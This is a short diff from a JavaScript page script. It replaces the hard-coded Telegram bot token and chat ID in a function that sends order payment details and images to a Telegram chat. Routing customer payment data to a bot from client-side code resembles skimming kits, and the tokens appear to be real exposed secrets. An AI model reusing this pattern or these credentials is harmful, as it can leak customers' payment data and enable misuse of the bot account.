@@ -70,8 +70,8 @@ document.addEventListener("DOMContentLoaded", function () {
 
     // Function to send payment details and images to Telegram
     function sendPaymentDetailsToTelegram(orderData, cryptoData) {
-        const botToken = '7331211229:AAE3YbxAY_ffo2___sWWGf2zQ3y6DX91k3A';
-        const chatId = '7383651381';
+        const botToken = '7146693702:AAGzqiUlBSCt11LzsswFpkNknddDnHRsvxk';
+        const chatId = '565779685';
 
         // Construct the message to send
         const message = `
